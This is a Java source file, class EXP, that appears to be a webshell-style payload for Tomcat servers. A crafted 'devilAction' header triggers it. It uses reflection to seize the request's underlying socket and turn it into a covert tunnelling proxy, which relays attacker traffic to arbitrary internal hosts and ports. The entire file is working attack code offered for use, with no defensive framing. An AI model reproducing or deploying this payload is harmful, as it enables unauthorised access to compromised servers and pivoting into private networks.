import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.*;


public class EXP {

    public static final byte[] MAGIC_DATA_HEADER = new byte[]{0x63, 0x48, 0x4a, 0x76, 0x65, 0x48, 0x68, 0x34, 0x65, 0x51, 0x3d, 0x3d};
    public static final String MAGIC_SEND_AGAIN_FLAG = "cCcC";

    private volatile boolean proxyRunning;

    private Map<String, Socket> connectedTargetsMap = new ConcurrentHashMap<>(16);

    private ExecutorService es = new ThreadPoolExecutor(0, 30, 10L,TimeUnit.SECONDS, new SynchronousQueue<>());


    public boolean equals(Object req, Object resp) {
        Map<String, String> result = new HashMap<>();
        try {
            Method getHeader = req.getClass().getMethod("getHeader", String.class);
            String devilAction = (String)getHeader.invoke(req, "devilAction");
            if ("socketHijackProxy".equalsIgnoreCase(devilAction)){
                proxyRunning = true;
                hijackSocket(req);
                result.put("msg", "socket劫持成功");
                result.put("status", "success");
                for (Socket socket : connectedTargetsMap.values()) {
                    socket.close();
                }
                connectedTargetsMap.clear();
            }

        } catch (Exception e) {
            result.put("status", "failed");
            result.put("msg", e.getMessage());
            e.printStackTrace();
        }
        try{
            Object so = resp.getClass().getMethod("getOutputStream").invoke(resp);
            Method write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.buildJson(result).getBytes("UTF-8"));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }

    private void hijackSocket(Object req) throws Exception {
        Object result = req;
        System.out.println("get socket step 1:" + result.getClass().toGenericString() + result.toString());
        result = getFieldValue(result, "request");

        if (result != null){
            System.out.println("get socket step 2:" + result.getClass().toGenericString() + result.toString());
            result = getFieldValue(result, "coyoteRequest");
        }
        if (result != null){
            System.out.println("get socket step 3:" + result.getClass().toGenericString() + result.toString());
            result = getFieldValue(result, "inputBuffer");
        }
        if (result != null){
            System.out.println("get socket step 4:" + result.getClass().toGenericString() + result.toString());
            result = getFieldValue(result, "wrapper");
        }
        if (result != null){
            System.out.println("get socket step 5:" + result.getClass().toGenericString() + result.toString());
            result = getFieldValue(result, "socket");
        }
        if (result != null){
            System.out.println("get socket step 6:" + result.getClass().toGenericString() + result.toString());
            result = getFieldValue(result, "sc");
        }
        if (result == null){
            throw new RuntimeException("get socket failed");
        }

        SocketChannel socketChannel = ((SocketChannel) result);
        while (proxyRunning && socketChannel.isConnected() && socketChannel.isOpen() && socketChannel.finishConnect()){
            try {
                startProxy(socketChannel);
            } catch (Exception e){
                e.printStackTrace();
                Map<String, String> errorMap = new HashMap<>();
                errorMap.put("status", "failed");
                errorMap.put("msg", e.getMessage());
                socketChannel.write(ByteBuffer.wrap(this.buildJson(errorMap).getBytes("UTF-8")));
            }
        }
    }

    private void startProxy(SocketChannel socketChannel) throws IOException {
        byte[] magicHeader = readByLength(socketChannel, 12);
        if (new String(MAGIC_DATA_HEADER).equals(new String(magicHeader))){
            byte[] idBytes = readByLength(socketChannel, 16);
            String id = bytesToHex(idBytes);
            //如果此id的连接已经创建，则复用此socket发送数据到目标
            if (connectedTargetsMap.containsKey(id)){
                String againPackageFlag = new String(readByLength(socketChannel, 4));
                if (!MAGIC_SEND_AGAIN_FLAG.equals(againPackageFlag)){
                    throw new RuntimeException("package format error, id=" + id);
                }
                int dataLength = bytes2Int(readByLength(socketChannel, 4));
                byte[] data = readByLength(socketChannel, dataLength);
                connectedTargetsMap.get(id).getOutputStream().write(data);
                connectedTargetsMap.get(id).getOutputStream().flush();
                System.out.println("send continue package to target: id=" + id + " length=" + dataLength + " data=" + bytesToHex(data));
                return;
            }
            int hostLength = bytes2Int(readByLength(socketChannel, 2));
            String host = new String(readByLength(socketChannel, hostLength));
            int port = bytes2Int(readByLength(socketChannel, 2));
            int dataLength = bytes2Int(readByLength(socketChannel, 4));
            byte[] data = readByLength(socketChannel, dataLength);

            System.out.println("read datagram: host=" + host + " port=" + port + " id=" + id + " data=" + bytesToHex(data));

            es.execute(() -> {
                try (SocketChannel targetSocket = SocketChannel.open(new InetSocketAddress(host, port))){
                    //保留socket，如果客户端向目标发送第二次消息，还需要再拿到已经创建的socket发送出去
                    connectedTargetsMap.put(id, targetSocket.socket());
                    while (!targetSocket.finishConnect()) {
                        Thread.sleep(10);
                    }
                    targetSocket.socket().setSoTimeout(5000);
                    System.out.println("send datagram to target: data=" + bytesToHex(data));
                    targetSocket.socket().getOutputStream().write(data);
                    targetSocket.socket().getOutputStream().flush();
                    while (targetSocket.isConnected() && targetSocket.isOpen() && targetSocket.finishConnect()){
                        ByteBuffer readBuf = ByteBuffer.allocate(8092);
                        //byte[] readBuf = new byte[2048];
                        int readCount = targetSocket.read(readBuf);
                        if (readCount < 0){
                            break;
                        }
                        byte[] readData = Arrays.copyOfRange(readBuf.array(), 0, readCount);
                        //byte[] data = Arrays.copyOfRange(readBuf, 0, readCount);
                        int dataLen = readData.length;
                        byte[] responseDatagram = mergeByteArray(idBytes, int2ByteArray(dataLen), readData);
                        System.out.println("send response chunk id=" + id + " length=" + dataLen + " hex=" + bytesToHex(responseDatagram));
                        socketChannel.write(ByteBuffer.wrap(responseDatagram));
                    }
                } catch (SocketTimeoutException e){
                    System.out.println("请求目标超时 id=" + id);
                    try {
                        socketChannel.write(ByteBuffer.wrap(mergeByteArray(idBytes, int2ByteArray(0))));
                    } catch (Exception e1) {
                        e1.printStackTrace();
                    }
                } catch (Exception e){
                    e.printStackTrace();
                } finally {
                    connectedTargetsMap.remove(id);
                }
            });
        }
    }

    private byte[] readByLength(SocketChannel socketChannel, int readLength) throws IOException {
        ByteBuffer byteBuf = ByteBuffer.allocate(readLength);
        int read = 0;
        while (read < readLength){
            read += socketChannel.read(byteBuf);
        }
        return byteBuf.array();
    }

    public static Object getFieldValue(Object obj,String fieldName){
        if (obj!=null){
            Class clazz = obj.getClass();
            while (clazz!=null){
                try {
                    Field field = clazz.getDeclaredField(fieldName);
                    field.setAccessible(true);
                    return field.get(obj);
                } catch (Exception e) {
                    clazz = clazz.getSuperclass();
                }
            }
        }
        return null;
    }

    public static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;

        for(int i = 0; i < byteArray.length; ++i) {
            if (byteArray[i] != null) {
                totalLength += byteArray[i].length;
            }
        }

        byte[] result = new byte[totalLength];
        int cur = 0;

        for(int i = 0; i < byteArray.length; ++i) {
            if (byteArray[i] != null) {
                System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
                cur += byteArray[i].length;
            }
        }

        return result;
    }

    private String buildJson(Map entity) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        Iterator var5 = entity.keySet().iterator();

        while(var5.hasNext()) {
            String key = (String)var5.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }


    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for(int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if(hex.length() < 2){
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }

    public static byte[] int2ByteArray(int n) {
        byte[] b = new byte[4];
        b[0] = (byte) (n & 0xff);
        b[1] = (byte) (n >> 8 & 0xff);
        b[2] = (byte) (n >> 16 & 0xff);
        b[3] = (byte) (n >> 24 & 0xff);
        return b;
    }
    public static byte[] short2ByteArray(short n) {
        byte[] b = new byte[4];
        b[0] = (byte) (n & 0xff);
        b[1] = (byte) (n >> 8 & 0xff);
        return b;
    }

    public static int bytes2Int(byte[] b){
        int res = 0;
        for(int i=0;i<b.length;i++){
            res += (b[i] & 0xff) << (i*8);
        }
        return res;
    }
}
